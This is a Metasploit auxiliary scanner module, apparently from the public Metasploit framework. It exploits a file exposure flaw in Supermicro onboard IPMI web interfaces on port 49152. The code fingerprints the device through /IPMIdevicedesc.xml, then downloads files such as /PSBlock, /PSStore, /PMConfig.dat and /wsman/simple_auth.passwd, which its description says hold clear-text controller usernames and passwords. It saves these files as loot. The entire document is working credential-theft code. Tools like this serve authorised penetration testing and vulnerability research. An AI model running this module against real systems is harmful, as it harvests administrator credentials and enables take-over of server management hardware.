##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'uri'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Supermicro Onboard IPMI Port 49152 Sensitive File Exposure',
      'Description' => %q{
        This module abuses a file exposure vulnerability accessible through the web interface 
        on port 49152 of Supermicro Onboard IPMI controllers.  The vulnerability allows an attacker
        to obtain detailed device information and download data files containing the clear-text
        usernames and passwords for the controller. In May of 2014, at least 30,000 unique IPs 
        were exposed to the internet with this vulnerability.
      },
      'Author'       =>
        [
          'Zach Wikholm <kestrel[at]trylinux.us>', # Discovery and analysis
          'John Matherly <jmath[at]shodan.io>',    # Internet-wide scan
          'Dan Farmer <zen[at]fish2.com>',         # Additional investigation
          'hdm'                                    # Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://github.com/zenfish/ipmi/blob/master/dump_SM.py']
        ],
      'DisclosureDate' => 'Jun 12 2014'))

    register_options(
      [
        Opt::RPORT(49152)
      ], self.class)
  end

  def is_supermicro?
    res = send_request_cgi(
      {
        "uri"       => "/IPMIdevicedesc.xml",
        "method"    => "GET"
      })

    if res and res.code == 200 and res.body.to_s =~ /supermicro/i
      path = store_loot(
        'supermicro.ipmi.devicexml',
        'text/xml',
        rhost,
        res.body.to_s,
        'IPMIdevicedesc.xml'
      )
      print_good("#{peer} - Stored the device description XML in #{path}")
      return true
    else
      return false
    end
  end


  def run_host(ip)

    unless is_supermicro?
      print_error("#{peer} - This does not appear to be a Supermicro IPMI controller")
      return
    end

    candidates = %W{ /PSBlock /PSStore /PMConfig.dat /wsman/simple_auth.passwd }

    candidates.each do |uri|
      res = send_request_cgi(
        {
          "uri"       => uri,
          "method"    => "GET"
        })

      next unless res

      unless res.code == 200 and res.body.length > 0
        vprint_status("#{peer} - Request for #{uri} resulted in #{res.code}")
        next
      end

      path = store_loot(
        'supermicro.ipmi.passwords',
        'application/octet-stream',
        rhost,
        res.body.to_s,
        uri.split('/').last
      )
      print_good("#{peer} - Stored password block found at #{uri} in #{path}")
    end
  end

end
